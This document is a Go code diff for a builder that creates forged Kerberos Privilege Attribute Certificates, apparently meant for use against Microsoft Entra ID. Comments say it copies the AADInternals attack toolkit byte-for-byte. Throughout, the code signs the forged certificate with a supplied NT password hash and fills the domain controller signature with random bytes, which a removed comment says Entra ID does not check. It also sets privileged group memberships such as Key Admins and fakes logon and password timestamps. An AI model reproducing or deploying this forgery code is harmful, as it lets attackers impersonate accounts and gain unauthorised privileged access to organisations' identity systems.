@@ -12,10 +12,11 @@ import (
 	"bytes"
 	"crypto/hmac"
 	"crypto/md5"
+	cryptorand "crypto/rand"
 	"encoding/binary"
 	"fmt"
+	"math"
 	"time"
-	
 )
 
 // Info buffer type constants ([MS-PAC] §2.4)
@@ -29,17 +30,19 @@ const (
 
 // Checksum type constants
 const (
-	ChecksumTypeHMACMD5             uint32 = 0xFFFFFF76 // -138 as unsigned
-	ChecksumHMACMD5Size                    = 16
-	ChecksumTypeHMACSHA196AES256    uint32 = 16
-	ChecksumHMACSHA196AES256Size           = 12
+	ChecksumTypeHMACMD5          uint32 = 0xFFFFFF76 // -138 as unsigned
+	ChecksumHMACMD5Size                 = 16
+	ChecksumTypeHMACSHA196AES256 uint32 = 16
+	ChecksumHMACSHA196AES256Size        = 12
 )
 
 const (
 	signatureKeyBytes = "signaturekey\x00"
 	userFlagNormal    = 0x20
-	userAccountNormal = 0x200
 	primaryGroupRID   = 513 // Domain Users
+	groupCount        = 2
+	groupRID1         = 515 // Domain Computers
+	groupRID2         = 527 // Key Admins
 )
 
 // BuildParams holds the input data for PAC construction.
@@ -48,32 +51,38 @@ type BuildParams struct {
 	UserRID       uint32
 	DomainNetBIOS string
 	DomainFQDN    string
+	Realm         string
 	UPN           string
 	FullName      string
+	ServerName    string
 	NTHash        []byte
 }
 
 // Builder constructs PAC blobs. Use NewBuilder for a configured instance.
 type Builder struct {
-	params *BuildParams
-	now    uint64 // FileTime in 100ns intervals
+	params   *BuildParams
+	now      uint64 // FileTime in 100ns intervals
+	authTime uint64
 }
 
 // NewBuilder creates a PAC builder for the given parameters.
 func NewBuilder(params *BuildParams) *Builder {
+	ft := filetimeNow()
 	return &Builder{
-		params: params,
-		now:    filetimeNow(),
+		params:   params,
+		now:      ft,
+		authTime: ft,
 	}
+}
+
+// SetAuthTime overrides the LogOnTime used in KerbValidationInfo and ClientInfo.
+func (b *Builder) SetAuthTime(ft uint64) {
+	b.authTime = ft
 }
 
 // Build assembles the complete PAC binary blob with all 5 InfoBuffers
 // and correct HMAC-MD5 server checksum.
-//
-// Returns the raw PACTYPE bytes suitable for embedding in EncTicketPart
-// authorization-data.
 func (b *Builder) Build() ([]byte, error) {
-	// 1. Encode individual info buffer payloads
 	kvi, err := b.encodeKerbValidationInfo()
 	if err != nil {
 		return nil, fmt.Errorf("pac: KerbValidationInfo: %w", err)
@@ -81,12 +90,8 @@ func (b *Builder) Build() ([]byte, error) {
 	ci := b.encodeClientInfo()
 	udi := b.encodeUPNDNSInfo()
 
-	// Server signature: placeholder (zeroed), filled after checksum
 	serverSig := signaturePlaceholder(ChecksumTypeHMACMD5, ChecksumHMACMD5Size)
-	// KDC signature: random/garbage (Entra ID does not validate this)
 	kdcSig := signaturePlaceholder(ChecksumTypeHMACSHA196AES256, ChecksumHMACSHA196AES256Size)
-	// Fill KDC sig with random bytes (AADInternals: "random checksum will do")
-	fillRandom(kdcSig[4:])
 
 	buffers := []struct {
 		ulType uint32
@@ -103,106 +108,173 @@ func (b *Builder) Build() ([]byte, error) {
 }
 
 // encodeKerbValidationInfo NDR-encodes KERB_VALIDATION_INFO.
-// Layout follows [MS-PAC] §2.5 with NDR deferred pointers.
+// Matches AADInternals New-PAC layout byte-for-byte.
 func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
-	var buf bytes.Buffer
+	p := b.params
+	userName := usernameFromUPN(p.UPN)
 
-	// FileTime fields (8 bytes each, 6 of them)
-	putFileTime(&buf, b.now)       // LogOnTime
-	putFileTime(&buf, 0)           // LogOffTime
-	putFileTime(&buf, 0)           // KickOffTime
-	putFileTime(&buf, b.now)       // PasswordLastSet
-	putFileTime(&buf, 0)           // PasswordCanChange
-	putFileTime(&buf, 0)           // PasswordMustChange
+	bUserName := utf16Encode(userName)
+	bDisplayName := utf16Encode(p.FullName)
+	bServerName := utf16Encode(serverOrDC(p))
+	bDomainName := utf16Encode(p.DomainNetBIOS)
 
-	// RPC_UNICODE_STRING fields — NDR conformant varying strings
-	putConformantString(&buf, b.params.DomainNetBIOS+"\\Administrator") // EffectiveName
-	putConformantString(&buf, b.params.FullName)                         // FullName
-	putConformantString(&buf, "")                                        // LogonScript
-	putConformantString(&buf, "")                                        // ProfilePath
-	putConformantString(&buf, "")                                        // HomeDirectory
-	putConformantString(&buf, "")                                        // HomeDirectoryDrive
+	logonTime := b.authTime - ftMinutes(10)
+	logoffTime := uint64(math.MaxInt64)
+	pwdLastSet := b.now - ftDays(10)
+	pwdCanChange := pwdLastSet + ftDays(1)
+	pwdMustChange := uint64(math.MaxInt64)
 
-	// uint16 fields
-	putU16(&buf, 0) // LogonCount
-	putU16(&buf, 0) // BadPasswordCount
-
-	// uint32: UserID, PrimaryGroupID
-	putU32(&buf, b.params.UserRID) // UserID
-	putU32(&buf, primaryGroupRID)  // PrimaryGroupID
-
-	// GroupIDs — NDR conformant array of GROUP_MEMBERSHIP
-	putU32(&buf, 1)    // GroupCount
-	putU32(&buf, 0)    // GroupIDs pointer (embedded — no referent)
-	binary.Write(&buf, binary.LittleEndian, uint32(1))      // MaxCount
-	putGroupMembership(&buf, primaryGroupRID, 7)             // Domain Users, SE_GROUP_MANDATORY|ENABLED|ENABLED_BY_DEFAULT
-
-	// UserFlags
-	putU32(&buf, userFlagNormal)
-
-	// UserSessionKey — 2 bytes type + 2 bytes length + pointer (0)
-	putU16(&buf, 0) // KeyType
-	putU16(&buf, 0) // KeyLength
-	putU32(&buf, 0) // Null pointer
-
-	// LogonServer, LogonDomainName
-	putConformantString(&buf, "")                // LogonServer
-	putConformantString(&buf, b.params.DomainFQDN) // LogonDomainName
-
-	// LogonDomainID — pointer to SID
-	sidBytes, err := parseSID(b.params.UserSID)
+	sidBytes, err := parseSID(p.UserSID)
 	if err != nil {
 		return nil, fmt.Errorf("parse SID: %w", err)
 	}
-	putU32(&buf, 0x20004)                    // Pointer referent ID
-	binary.Write(&buf, binary.LittleEndian, uint32(len(sidBytes))) // MaxCount
-	buf.Write(sidBytes)
+	userSID := make([]byte, 4) // last 4 bytes = RID
+	copy(userSID, sidBytes[len(sidBytes)-4:])
+	domainSID := make([]byte, len(sidBytes)-4) // first N-4 bytes = domain prefix
+	copy(domainSID, sidBytes[:len(sidBytes)-4])
+	domainSID[1] = 4 // change revision from 5 to 4
 
-	// Reserved1[2]
-	putU32(&buf, 0)
-	putU32(&buf, 0)
+	// ---- Build LOGON_INFORMATION inline body ----
+	var body bytes.Buffer
 
-	// UserAccountControl, SubAuthStatus
-	putU32(&buf, userAccountNormal)
-	putU32(&buf, 0) // SubAuthStatus
+	// NDR common header (20 bytes)
+	body.Write([]byte{0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc}) // version, endian, common header len, filler
+	putU32(&body, 0) // info buffer length placeholder (filled later)
+	putU32(&body, 0) // zeros
+	putU32(&body, 0x00020000) // user info pointer
 
-	// FileTime fields
-	putFileTime(&buf, 0) // LastSuccessfulILogon
-	putFileTime(&buf, 0) // LastFailedILogon
+	// FileTimes (6 × 8 = 48 bytes)
+	putFileTime(&body, logonTime)
+	putFileTime(&body, logoffTime)
+	putFileTime(&body, logoffTime) // KickOffTime = max int64
+	putFileTime(&body, pwdLastSet)
+	putFileTime(&body, pwdCanChange)
+	putFileTime(&body, pwdMustChange)
 
-	// FailedILogonCount, Reserved3
-	putU32(&buf, 0)
-	putU32(&buf, 0)
+	// RPC_UNICODE_STRINGs (6): UserName, DisplayName, LogonScript, ProfilePath, HomeDirectory, HomeDrive
+	putRPCUnicodeString(&body, len(bUserName), len(bUserName), 0x00020004)    // UserName
+	putRPCUnicodeString(&body, len(bDisplayName), len(bDisplayName), 0x00020008) // DisplayName
+	putRPCUnicodeString(&body, 0, 0, 0x0002000c) // LogonScript
+	putRPCUnicodeString(&body, 0, 0, 0x00020010) // ProfilePath
+	putRPCUnicodeString(&body, 0, 0, 0x00020014) // HomeDirectory
+	putRPCUnicodeString(&body, 0, 0, 0x00020018) // HomeDrive
 
-	// ExtraSIDs — conformant array of KERB_SID_AND_ATTRIBUTES
-	putU32(&buf, 1)        // SIDCount
-	putU32(&buf, 0x20008)  // Pointer to ExtraSIDs array
-	binary.Write(&buf, binary.LittleEndian, uint32(1)) // MaxCount
-	// ENTERPRISE_AUTHENTICATION SID: S-1-18-1
-	entAuthSID := []byte{1, 1, 0, 0, 0, 0, 0, 18, 1, 0, 0, 0}
-	putU32(&buf, 0x20010)                    // Pointer to SID
-	binary.Write(&buf, binary.LittleEndian, uint32(len(entAuthSID))) // MaxCount
-	buf.Write(entAuthSID)
-	putU32(&buf, 0) // Attributes (no extra flag needed)
+	// uint16: LogonCount, BadPasswordCount (4 bytes)
+	putU16(&body, 5)
+	putU16(&body, 0)
 
-	// ResourceGroupDomainSID — pointer (null)
-	putU32(&buf, 0)
+	// uint32: UserID (RID), PrimaryGroupID (8 bytes)
+	body.Write(userSID)             // UserRID (4 bytes, little-endian from SID tail)
+	putU32(&body, primaryGroupRID)  // 513 = Domain Users
 
-	// ResourceGroupIDs — empty conformant array
-	putU32(&buf, 0) // ResourceGroupCount
-	putU32(&buf, 0) // Null pointer
+	// GroupCount + GroupPointer (8 bytes)
+	putU32(&body, groupCount)        // 2 groups
+	putU32(&body, 0x0002001c)        // pointer to GroupIDs
 
-	return buf.Bytes(), nil
+	// UserFlags (4 bytes)
+	putU32(&body, userFlagNormal)    // 0x20
+
+	// UserSessionKey (16 bytes, all zeros — only used for NTLM)
+	body.Write(make([]byte, 16))
+
+	// RPC_UNICODE_STRING: ServerName + DomainName (8+8=16 bytes)
+	putRPCUnicodeString(&body, len(bServerName), len(bServerName)+2, 0x00020020) // ServerName
+	putRPCUnicodeString(&body, len(bDomainName), len(bDomainName)+2, 0x00020024) // LogonDomainName
+
+	// DomainIDPointer (4 bytes)
+	putU32(&body, 0x00020028)
+
+	// Reserved (8 bytes)
+	body.Write(make([]byte, 8))
+
+	// UserAccountControl (4 bytes)
+	putU32(&body, 0x80) // USER_WORKSTATION_TRUST_ACCOUNT
+
+	// SubAuthStatus (4 bytes)
+	putU32(&body, 0)
+
+	// LastSuccessfulILogon, LastFailedILogon (16 bytes)
+	body.Write(make([]byte, 16))
+
+	// FailedILogonCount, Reserved3 (8 bytes)
+	putU32(&body, 0)
+	putU32(&body, 0)
+
+	// ExtraSIDs (8 bytes)
+	putU32(&body, 1)             // ExtraSIDCount
+	putU32(&body, 0x0002002c)    // ExtraSIDPointer
+
+	// ResourceGroup fields (12 bytes)
+	putU32(&body, 0) // ResourceDomainIDPointer (null)
+	putU32(&body, 0) // ResourceGroupCount
+	putU32(&body, 0) // ResourceGroupPointer
+
+	// ---- Deferred referent area ----
+	var refs bytes.Buffer
+
+	// UserName: NDR conformant varying string
+	putNDRString(&refs, bUserName)
+	padTo4(&refs)
+
+	// UserDisplayName: NDR conformant varying string
+	if len(bDisplayName) > 0 {
+		putNDRString(&refs, bDisplayName)
+		padTo4(&refs)
+	} else {
+		refs.Write(make([]byte, 12)) // empty = 12 zeros
+	}
+
+	// LogonScript: 12 zeros
+	refs.Write(make([]byte, 12))
+	// ProfilePath: 12 zeros
+	refs.Write(make([]byte, 12))
+	// HomeDirectory: 12 zeros
+	refs.Write(make([]byte, 12))
+	// HomeDrive: 12 zeros
+	refs.Write(make([]byte, 12))
+
+	// GroupIDs: Count + [RID, Attrs] * groupCount
+	putU32(&refs, groupCount)
+	putGroupMembership(&refs, groupRID1, 7)
+	putGroupMembership(&refs, groupRID2, 7)
+
+	// ServerName: NDR conformant varying
+	putNDRStringWithTotal(&refs, bServerName, len(bServerName)/2+1)
+	padTo4(&refs)
+
+	// LogonDomainName: NDR conformant varying
+	putNDRStringWithTotal(&refs, bDomainName, len(bDomainName)/2+1)
+	padTo4(&refs)
+
+	// DomainSID: Count + SID bytes
+	putU32(&refs, uint32(domainSID[1])) // count of sub-authorities
+	refs.Write(domainSID)
+
+	// ExtraSIDs: Count + Pointer + Attrs + SID binary
+	putU32(&refs, 1) // SID count
+	putU32(&refs, 0x00020030)
+	putU32(&refs, 7) // Attributes
+	putU32(&refs, 1) // SID size (sub-authority count)
+	refs.Write([]byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}) // S-1-18-1
+
+	// Assemble: body + deferred refs
+	kviBuf := make([]byte, body.Len()+refs.Len())
+	copy(kviBuf, body.Bytes())
+	copy(kviBuf[body.Len():], refs.Bytes())
+
+	// Fill in info buffer length (total - 0x10 for the 16-byte wrapper header)
+	infoLen := len(kviBuf) - 16
+	binary.LittleEndian.PutUint32(kviBuf[8:12], uint32(infoLen))
+
+	return kviBuf, nil
 }
 
 // encodeClientInfo serializes PAC_CLIENT_INFO (not NDR-encoded per [MS-PAC] §2.7).
 func (b *Builder) encodeClientInfo() []byte {
 	var buf bytes.Buffer
-	putFileTime(&buf, b.now)
-	// Client name: NetBIOSDomain\UserName
-	name := b.params.DomainNetBIOS + "\\" + usernameFromUPN(b.params.UPN)
-	nameUTF16 := utf16Encode(name)
-	putU16(&buf, uint16(len(nameUTF16))) // NameLength in bytes
+	putFileTime(&buf, b.authTime)
+	nameUTF16 := utf16Encode(usernameFromUPN(b.params.UPN))
+	putU16(&buf, uint16(len(nameUTF16)))
 	buf.Write(nameUTF16)
 	return buf.Bytes()
 }
@@ -210,22 +282,22 @@ func (b *Builder) encodeClientInfo() []byte {
 // encodeUPNDNSInfo serializes UPN_DNS_INFO (not NDR-encoded per [MS-PAC] §2.9).
 func (b *Builder) encodeUPNDNSInfo() []byte {
 	upnUTF16 := utf16Encode(b.params.UPN)
-	dnsUTF16 := utf16Encode(b.params.DomainFQDN)
+	dnsUTF16 := utf16Encode(b.params.Realm)
 	upnLen := uint16(len(upnUTF16))
 	dnsLen := uint16(len(dnsUTF16))
 
 	var buf bytes.Buffer
 	putU16(&buf, upnLen)
-	dnsOff := uint16(16 + int(upnLen))
+	putU16(&buf, uint16(0x10)) // UPN offset
+	putU16(&buf, dnsLen)
+	dnsOff := uint16(0x10 + int(upnLen))
 	if dnsOff%2 != 0 {
 		dnsOff++
 	}
-	putU16(&buf, uint16(16)) // UPN starts after 4*u16 + u32
-	putU16(&buf, dnsLen)
 	putU16(&buf, dnsOff)
 	putU32(&buf, 0) // Flags
+	putU32(&buf, 0) // alignment
 	buf.Write(upnUTF16)
-	// Align to 2-byte boundary
 	if buf.Len()%2 != 0 {
 		buf.WriteByte(0)
 	}
@@ -233,66 +305,60 @@ func (b *Builder) encodeUPNDNSInfo() []byte {
 	return buf.Bytes()
 }
 
-// assemble constructs the full PACTYPE binary given encoded info buffers.
-// It calculates 8-byte-aligned offsets, builds the header + InfoBuffer array,
-// and computes the HMAC-MD5 server checksum.
+// assemble constructs the full PACTYPE binary with headers and checksums.
 func (b *Builder) assemble(buffers []struct {
 	ulType uint32
 	data   []byte
 }) ([]byte, error) {
 	nBuf := len(buffers)
-	headerSize := 8 + nBuf*16 // CBuffers(4) + Version(4) + InfoBuffer entries
+	headerSize := 8 + nBuf*16
 
-	// Calculate offsets (8-byte aligned)
 	offsets := make([]uint64, nBuf)
+	alignedSizes := make([]int, nBuf)
 	offset := roundUp(headerSize, 8)
 	for i, buf := range buffers {
 		offsets[i] = uint64(offset)
+		alignedSizes[i] = roundUp(len(buf.data), 8)
 		offset = roundUp(offset+len(buf.data), 8)
 	}
 
 	totalSize := offset
 	pacBytes := make([]byte, totalSize)
 
-	// Header
-	binary.LittleEndian.PutUint32(pacBytes[0:4], uint32(nBuf)) // CBuffers
-	binary.LittleEndian.PutUint32(pacBytes[4:8], 0)             // Version
+	binary.LittleEndian.PutUint32(pacBytes[0:4], uint32(nBuf))
+	binary.LittleEndian.PutUint32(pacBytes[4:8], 0)
 
-	// InfoBuffer entries
 	for i, buf := range buffers {
 		off := 8 + i*16
+		cbSize := uint32(alignedSizes[i])
+		if buf.ulType == InfoTypePACServerSignature {
+			cbSize -= 4
+		}
 		binary.LittleEndian.PutUint32(pacBytes[off:off+4], buf.ulType)
-		binary.LittleEndian.PutUint32(pacBytes[off+4:off+8], uint32(len(buf.data)))
+		binary.LittleEndian.PutUint32(pacBytes[off+4:off+8], cbSize)
 		binary.LittleEndian.PutUint64(pacBytes[off+8:off+16], offsets[i])
 	}
 
-	// Data blobs
 	for i, buf := range buffers {
 		copy(pacBytes[offsets[i]:], buf.data)
 	}
 
-	// Compute server checksum and fill it
 	serverSigStart := int(offsets[3])
 	serverSigBytes := pacBytes[serverSigStart : serverSigStart+len(buffers[3].data)]
+	kdcSigStart := int(offsets[4])
+
 	checksum := ServerChecksum(pacBytes, b.params.NTHash)
 	copy(serverSigBytes[4:4+ChecksumHMACMD5Size], checksum)
+
+	cryptorand.Read(pacBytes[kdcSigStart+4 : kdcSigStart+4+ChecksumHMACSHA196AES256Size])
 
 	return pacBytes, nil
 }
 
 // ---------- Checksum ----------
 
-// ServerChecksum computes the HMAC-MD5 server signature for the PAC.
-// Matches AADInternals Get-ServerSignature:
-//
-//	Ksign = HMAC-MD5(NTHash, "signaturekey\x00")
-//	tmp   = MD5(0x11000000 || pacData)     -- prefix is 4-byte little-endian 0x11
-//	Checksum = HMAC-MD5(Ksign, tmp)
-//
-// pacData must have the server signature bytes zeroed before calling.
 func ServerChecksum(pacData []byte, ntHash []byte) []byte {
 	ksign := hmacMD5(ntHash, []byte(signatureKeyBytes))
-	// Per [MS-KILE] §3.3.5.6.4.1: MD5 of the PAC with 0x11000000 prefix
 	prefix := []byte{0x11, 0x00, 0x00, 0x00}
 	tmp := md5Hash(append(prefix, pacData...))
 	return hmacMD5(ksign, tmp)
@@ -317,13 +383,26 @@ func putFileTime(w *bytes.Buffer, ft uint64) {
 	binary.Write(w, binary.LittleEndian, uint32(ft>>32))
 }
 
-func putConformantString(w *bytes.Buffer, s string) {
-	utf16 := utf16Encode(s)
-	maxCount := uint32(len(utf16) / 2)
-	binary.Write(w, binary.LittleEndian, maxCount)  // MaximumCount
-	binary.Write(w, binary.LittleEndian, uint32(0)) // Offset
-	binary.Write(w, binary.LittleEndian, maxCount)  // ActualCount
-	w.Write(utf16)
+func putRPCUnicodeString(w *bytes.Buffer, length, maxLength int, pointer uint32) {
+	putU16(w, uint16(length))
+	putU16(w, uint16(maxLength))
+	putU32(w, pointer)
+}
+
+func putNDRString(w *bytes.Buffer, utf16Data []byte) {
+	numChars := uint32(len(utf16Data) / 2)
+	putU32(w, numChars)          // MaximumCount
+	putU32(w, 0)                 // Offset
+	putU32(w, numChars)          // ActualCount
+	w.Write(utf16Data)
+}
+
+func putNDRStringWithTotal(w *bytes.Buffer, utf16Data []byte, totalChars int) {
+	actualChars := uint32(len(utf16Data) / 2)
+	putU32(w, uint32(totalChars)) // MaximumCount (includes null terminator)
+	putU32(w, 0)                   // Offset
+	putU32(w, actualChars)         // ActualCount (without null terminator)
+	w.Write(utf16Data)
 }
 
 func putGroupMembership(w *bytes.Buffer, rid uint32, attrs uint32) {
@@ -333,6 +412,12 @@ func putGroupMembership(w *bytes.Buffer, rid uint32, attrs uint32) {
 
 func putU16(w *bytes.Buffer, v uint16) { binary.Write(w, binary.LittleEndian, v) }
 func putU32(w *bytes.Buffer, v uint32) { binary.Write(w, binary.LittleEndian, v) }
+
+func padTo4(w *bytes.Buffer) {
+	for w.Len()%4 != 0 {
+		w.WriteByte(0)
+	}
+}
 
 func utf16Encode(s string) []byte {
 	var buf bytes.Buffer
@@ -346,6 +431,9 @@ func filetimeNow() uint64 {
 	return uint64(time.Now().UnixNano())/100 + 116444736000000000
 }
 
+func ftDays(d int) uint64    { return uint64(d) * 24 * 60 * 60 * 10000000 }
+func ftMinutes(d int) uint64 { return uint64(d) * 60 * 10000000 }
+
 func roundUp(n, align int) int { return (n + align - 1) & ^(align - 1) }
 
 func usernameFromUPN(upn string) string {
@@ -355,6 +443,13 @@ func usernameFromUPN(upn string) string {
 		}
 	}
 	return upn
+}
+
+func serverOrDC(p *BuildParams) string {
+	if p.ServerName != "" {
+		return p.ServerName
+	}
+	return p.DomainNetBIOS + "." + p.DomainFQDN
 }
 
 func signaturePlaceholder(sigType uint32, sigSize int) []byte {
@@ -372,14 +467,11 @@ func fillRandom(b []byte) {
 // parseSID converts "S-1-5-21-X-Y-Z-RID" to binary.
 func parseSID(s string) ([]byte, error) {
 	pos := 0
-
-	// Skip "S-"
 	if len(s) < 2 || s[0] != 'S' || s[1] != '-' {
 		return nil, fmt.Errorf("pac: invalid SID prefix: %s", s)
 	}
 	pos = 2
 
-	// Revision
 	rev, next, err := parseSIDComponent(s, pos)
 	if err != nil {
 		return nil, err
@@ -387,14 +479,12 @@ func parseSID(s string) ([]byte, error) {
 	revision := uint8(rev)
 	pos = next
 
-	// Identifier authority (next component, encoded as 6 bytes big-endian)
 	auth, next, err := parseSIDComponent(s, pos)
 	if err != nil {
 		return nil, err
 	}
 	pos = next
 
-	// Sub-authorities
 	var subs []uint32
 	for pos < len(s) {
 		sub, next, err := parseSIDComponent(s, pos)
@@ -406,7 +496,6 @@ func parseSID(s string) ([]byte, error) {
 	}
 
 	nSub := len(subs)
-
 	out := make([]byte, 8+4*nSub)
 	out[0] = revision
 	out[1] = byte(nSub)
@@ -434,11 +523,9 @@ func parseSIDComponent(s string, start int) (uint64, int, error) {
 	for i := start; i < end; i++ {
 		v = v*10 + uint64(s[i]-'0')
 	}
-	// Skip separator '-'
 	next := end
 	if next < len(s) && s[next] == '-' {
 		next++
 	}
 	return v, next, nil
 }
-
